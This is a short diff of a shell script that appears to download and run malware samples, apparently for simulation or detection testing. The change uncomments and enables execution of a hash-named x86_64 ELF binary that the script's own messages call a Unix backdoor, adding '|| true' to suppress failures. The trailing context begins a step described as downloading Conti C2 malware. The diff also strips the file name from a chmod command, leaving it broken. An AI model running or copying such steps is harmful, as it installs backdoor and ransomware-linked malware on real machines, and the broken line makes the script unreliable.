@@ -45,10 +45,10 @@ sleep 10
 
 # make executaable
 echo "[+] Making unixbackdoor executable"
-chmod 700 unixbackdoor.sh
+chmod 700 
 # execute 
 #echo "[+] Executing the Unix BackDoor"
-#05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true
 
 # Step 2 - Conti
 echo "[+] Downloading Conti-C2 malware"
